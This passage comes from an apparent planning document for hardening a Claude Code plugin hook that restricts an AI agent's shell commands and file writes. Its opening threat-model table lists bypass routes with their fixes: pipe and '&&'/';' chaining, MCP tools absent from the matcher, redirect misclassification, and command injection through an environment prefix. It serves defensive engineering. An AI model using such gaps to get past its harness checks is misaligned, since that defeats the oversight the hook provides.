|---------|--------|---------------------|
| FD-redirect misclassification (`>&1` as write) | Spoofing | ENF-02: extend pruning rules |
| Quoted `>` misclassification | Spoofing | ENF-03: strip quoted content |
| Pipe-chain bypass (`read_only \| mutating`) | Elevation of Privilege | ENF-08: scan all pipe segments |
| Chain bypass via `&&`/`;` | Elevation of Privilege | ENF-06: scan all chain segments |
| MCP tool bypass (tool name not in matcher) | Elevation of Privilege | Two-layer: manifest + case dispatch |
| Command injection via `export_env_prefix` | Tampering | Anchored regex: only `[A-Za-z_][A-Za-z0-9_]*` names accepted |
| FORGE_LEVEL_3 never activates (usability DoS) | Denial of Service | ENF-04: export parsed env vars before bypass check |

---

## Environment Availability

This phase is code/config-only changes with no external runtime dependencies beyond what the
existing enforcer already requires.

| Dependency | Required By | Available | Fallback |
|------------|------------|-----------|----------|
| `jq` | emit_decision, JSON parsing | ✅ (existing tests confirm) | exit 2 (hook contract) |
| `uuidgen` | gen_uuid | ✅ (macOS built-in) | N/A |
| `python3` | extract_task_hint | ✅ (existing tests confirm) | graceful fallback already in code |
| `bash 3.2+` | hook execution | ✅ | N/A |
| `shasum` | `_integrity` hash | ✅ (macOS built-in) | N/A |
| `awk` | segment splitting | ✅ (POSIX, always present) | N/A |
| `sed` | quote-stripping | ✅ (POSIX, always present) | N/A |

---

## Assumptions Log

| # | Claim | Section | Risk if Wrong |
|---|-------|---------|---------------|
| A1 | Bash `${var//[0-9]/}` glob class works for ENF-02 fd-redirect pruning on bash 3.2 | Bug Analysis ENF-02 | MEDIUM — if glob class is unsupported on macOS bash 3.2, use explicit `>&0`, `>&1`, `>&2`, `>&3` literals instead |
| A2 | Claude Code PreToolUse matcher accepts `\|`-separated MCP tool names in same format as built-in tools | Plugin Manifest | MEDIUM — existing matcher uses `\|` for Write/Edit/NotebookEdit/Bash; MCP names should work the same way. Not verified against Claude Code docs in this session. |
| A3 | MCP filesystem tools pass `path` (not `file_path`) in their `tool_input` | ENF-07 decide_mcp_write | LOW — `decide_mcp_write` uses `.path // .file_path` jq fallback; either field works |
| A4 | `is_allowed_doc_path` normalizing `./` prefix is sufficient for all Claude Code path formats | PATH fix | LOW — Claude Code typically passes paths without leading `./`, but normalization costs nothing |

**No user confirmation needed for any assumption before execution.** All A1–A4 risks are
handled in code (explicit fallbacks exist or the impact is minimal).

---

## Open Questions

1. **Bash glob class in parameter expansion on macOS bash 3.2 (A1)**
   - What we know: `${var//>&[0-9]/}` is a common pattern; works on bash 4+
   - What's unclear: Whether `[0-9]` character class in `${var//pattern/}` is fully supported on macOS stock bash (3.2.57)
   - Recommendation: Add a quick bash 3.2 test case in Wave 0. If it fails, switch to explicit literals `>&0`, `>&1`, `>&2`, etc.

2. **MCP matcher format in plugin.json (A2)**
   - What we know: Current matcher is pipe-separated, e.g. `"Write|Edit|NotebookEdit|Bash"`
   - What's unclear: Whether Claude Code plugin loader supports MCP-style tool names (`mcp__filesystem__*`) in the same matcher field
   - Recommendation: Keep the two-layer enforcement (manifest + case dispatch). If MCP names in the matcher are unsupported, the case dispatch in the enforcer still blocks them for any tool invocation where the hook runs (the hook currently fires for all 4 registered tool types). ENF-07 security is not solely dependent on the matcher working.

3. **Test file choice: extend `test_forge_enforcer_hook.bash` vs. new `test_v13_coverage.bash`**
   - What we know: `test_forge_enforcer_hook.bash` has 370 lines, already dense; `test_v12_coverage.bash` pattern is 389 lines for gap tests
   - Recommendation: Create `tests/test_v13_coverage.bash` as a separate file. Add it to `run_all.bash`. This keeps phase-scoped tests isolated and makes regressions easier to bisect. TEST-V13-04 (lib isolation) naturally belongs in a file that sources only the lib.

---

## Sources

### Primary (HIGH confidence)
- `hooks/forge-delegation-enforcer.sh` — direct code reading + function-level testing via `/tmp/enf_test1.sh` [VERIFIED]
- `hooks/forge-progress-surface.sh` — direct code reading (strip_ansi location confirmed)
- `tests/test_forge_enforcer_hook.bash` — baseline test inventory, inversion candidates identified
- `tests/test_v12_coverage.bash` — coverage gap tests, baseline confirmed green [VERIFIED]
- `.claude-plugin/plugin.json` — current version 1.2.4, current matcher, hash structure [VERIFIED]
- `bash tests/run_all.bash` output — 14 suites, 0 failures [VERIFIED]
- `.planning/REQUIREMENTS.md` — all 22 v1.3 Phase 10 requirements read and mapped
- Direct bash function invocation for ENF-02, ENF-03, ENF-05, ENF-06, ENF-08 bugs [VERIFIED]

### Secondary (MEDIUM confidence)
- `wc -l hooks/forge-delegation-enforcer.sh` — 447 lines [VERIFIED]
- Bug behavior confirmed via `/tmp/enf_test1.sh` test script run against live enforcer source

### Tertiary (LOW confidence)
- A2: Claude Code MCP matcher format — extrapolated from existing non-MCP matcher pattern

---

## Metadata

**Confidence breakdown:**
- Bug analysis (ENF-01–ENF-08): HIGH — all bugs confirmed via direct function invocation
- Fix strategies: HIGH — each fix follows patterns already used in the codebase
- Extraction scope: HIGH — line counts and dependencies verified against live source
- MCP matcher format: MEDIUM — pattern extrapolated; formal docs not checked
- Line count after extraction: MEDIUM — estimated ~295–315 lines; depends on comment density in new helpers

**Research date:** 2026-04-24
**Valid until:** Indefinite — closed codebase, no external dependency churn
